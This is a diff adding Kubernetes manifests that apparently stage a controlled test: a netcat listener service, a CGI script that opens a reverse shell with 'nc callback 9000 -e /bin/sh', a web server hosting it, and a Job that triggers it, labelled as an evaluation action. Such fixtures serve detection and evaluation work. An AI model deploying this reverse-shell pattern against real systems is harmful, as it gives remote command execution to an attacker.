@@ -1,0 +1,131 @@
+apiVersion: v1
+kind: Service
+metadata:
+  name: callback
+spec:
+  selector:
+    app: callback
+  ports:
+    - name: action
+      port: 9000
+      targetPort: 9000
+  type: ClusterIP
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: callback
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: callback
+  template:
+    metadata:
+      labels:
+        app: callback
+    spec:
+      containers:
+        - name: sink
+          image: alpine:3.20
+          command:
+            - /bin/sh
+            - '-ceu'
+            - while true; do printf 'printf controlled-callback; exit\n' | nc -l -p 9000; done
+          ports:
+            - name: action
+              containerPort: 9000
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: controlled-web-cgi
+data:
+  action: |
+    #!/bin/sh
+    printf "Content-Type: text/plain\n\n"
+    nc callback 9000 -e /bin/sh
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: controlled-web
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: controlled-web
+  template:
+    metadata:
+      labels:
+        app: controlled-web
+    spec:
+      initContainers:
+        - name: install-cgi
+          image: alpine:3.20
+          command:
+            - /bin/sh
+            - '-ceu'
+            - cp /source/action /www/cgi-bin/action && chmod 0755 /www/cgi-bin/action
+          volumeMounts:
+            - name: cgi-source
+              mountPath: /source
+            - name: www
+              mountPath: /www
+      containers:
+        - name: httpd
+          image: alpine:3.20
+          command:
+            - httpd
+            - '-f'
+            - '-p'
+            - '8080'
+            - '-h'
+            - /www
+          ports:
+            - name: http
+              containerPort: 8080
+          volumeMounts:
+            - name: www
+              mountPath: /www
+      volumes:
+        - name: cgi-source
+          configMap:
+            name: controlled-web-cgi
+        - name: www
+          emptyDir: {}
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: controlled-web
+spec:
+  selector:
+    app: controlled-web
+  ports:
+    - name: action
+      port: 8080
+      targetPort: 8080
+  type: ClusterIP
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: web-trigger
+  labels:
+    evals.kubernetes.io/controlled-action: web-trigger
+spec:
+  backoffLimit: 1
+  template:
+    metadata:
+      labels:
+        app: web-trigger
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: action
+          image: alpine:3.20
+          command:
+            - /bin/sh
+            - '-ceu'
+            - until wget -qO- http://controlled-web:8080/cgi-bin/action; do sleep 1; done
